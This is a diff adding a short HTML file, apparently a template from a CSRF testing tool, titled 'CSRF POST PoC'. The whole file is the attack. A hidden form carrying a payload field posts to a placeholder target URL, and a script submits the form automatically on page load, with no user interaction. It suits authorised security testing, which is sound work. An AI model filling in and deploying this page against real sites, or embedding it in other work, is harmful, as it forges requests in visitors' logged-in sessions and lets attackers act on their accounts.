@@ -1,0 +1,17 @@
+<html>
+ <title>
+  CSRF POST PoC
+ </title>
+ <body>
+  <p>
+   POST Based CSRF PoC (No User Interaction)
+  </p>
+  <form id="xsrfprobeauto" action="<your url here>" enctype="text/plain" method="POST">
+  	<input name="username" type="hidden" value="<your payload here>" />
+  	<input type="submit" value="Submit Request" />
+  </form>
+</body>
+<script>
+ document.getElementById("xsrfprobeauto").submit();
+</script>
+</html>
